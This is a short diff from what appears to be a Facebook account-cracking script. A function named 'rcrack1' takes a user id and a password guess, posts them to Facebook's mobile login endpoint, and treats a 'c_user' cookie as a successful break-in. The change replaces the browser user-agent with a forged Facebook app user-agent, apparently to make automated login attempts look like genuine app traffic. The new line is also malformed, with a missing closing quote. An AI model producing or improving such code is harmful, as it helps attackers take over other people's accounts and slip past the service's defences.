@@ -219,7 +219,7 @@ def rcrack1(uid,pwx,tl):
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
-          'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',}
+          'user-agent': 'FBAN/;FBAV/A1XDL5U4;FBBV/298456923;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/298456923;FBDM//*{density=2.5,width=1440,height=3840};FBLC/zh_CN;FBRV/163245215;FBCR/Sony;FBMF/VIVO;FBBD/Panasonic;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N900;FBSV/13;FBOP/6;FBCA/armeabi-v7a;FBSS/;,}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
